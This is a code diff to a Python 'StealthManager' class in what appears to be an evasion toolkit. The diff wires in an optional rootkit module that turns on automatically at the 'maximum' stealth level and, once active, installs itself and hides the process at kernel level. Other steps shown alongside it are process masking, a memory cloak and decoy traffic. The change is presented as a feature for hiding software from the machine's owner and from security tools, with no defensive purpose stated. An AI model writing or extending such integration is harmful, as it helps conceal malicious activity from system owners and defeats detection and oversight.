@@ -40,6 +40,13 @@ from stealth.transport_bridge import TransportBridge
 
 logger = logging.getLogger(__name__)
 
+# Optional rootkit import (only available when rootkit package is present)
+try:
+    from rootkit.manager import RootkitManager
+    _ROOTKIT_AVAILABLE = True
+except ImportError:
+    _ROOTKIT_AVAILABLE = False
+
 # ── Level presets ────────────────────────────────────────────────────
 # Each level specifies overrides applied on top of the user's config.
 
@@ -139,6 +146,15 @@ class StealthManager:
         self.env_sanitizer = EnvSanitizer(effective)
         self.transport_bridge = TransportBridge(self.network, effective.get("network"))
 
+        # ── Rootkit integration (v3, optional) ───────────────────────
+        self.rootkit: Any = None
+        if _ROOTKIT_AVAILABLE:
+            rootkit_cfg = raw_cfg.get("rootkit", {})
+            # Auto-enable rootkit at maximum level
+            if self._level == "maximum" and "enabled" not in rootkit_cfg:
+                rootkit_cfg["enabled"] = True
+            self.rootkit = RootkitManager(rootkit_cfg)
+
         self._activated = False
 
     # ── Public API ───────────────────────────────────────────────────
@@ -198,14 +214,25 @@ class StealthManager:
         # 8. Transport bridge — decoy traffic (if enabled at this level)
         self.transport_bridge.start_decoy_traffic()
 
-        # 9. Memory cloak — MUST be last (renames modules, scrubs __file__)
+        # 9. Memory cloak — MUST be last Python-level step (renames modules)
         self.memory_cloak.apply()
 
+        # 10. Rootkit — kernel-level hiding (if available and enabled)
+        if self.rootkit is not None and self.rootkit.enabled:
+            if self.rootkit.install():
+                self.rootkit.hide_self()
+                logger.debug("Rootkit: kernel-level hiding active")
+            else:
+                logger.debug("Rootkit: not loaded (no root or compilation failed)")
+
         self._activated = True
-        logger.debug("Stealth mode active (enhanced)")
+        logger.debug("Stealth mode active (enhanced + rootkit)")
 
     def stop(self) -> None:
         """Gracefully shut down stealth subsystems."""
+        # Unload rootkit first (restores kernel visibility for clean shutdown)
+        if self.rootkit is not None and self.rootkit.installed:
+            self.rootkit.uninstall()
         self.transport_bridge.stop_decoy_traffic()
         self.detection.stop()
         self.process_masker.stop()
@@ -224,6 +251,7 @@ class StealthManager:
             "crash_guard_installed": self.crash_guard._installed,
             "memory_cloak_applied": self.memory_cloak._applied,
             "env_sanitized": self.env_sanitizer._applied,
+            "rootkit": self.rootkit.get_status() if self.rootkit else {"enabled": False},
         }
 
     # ── Convenience accessors ────────────────────────────────────────
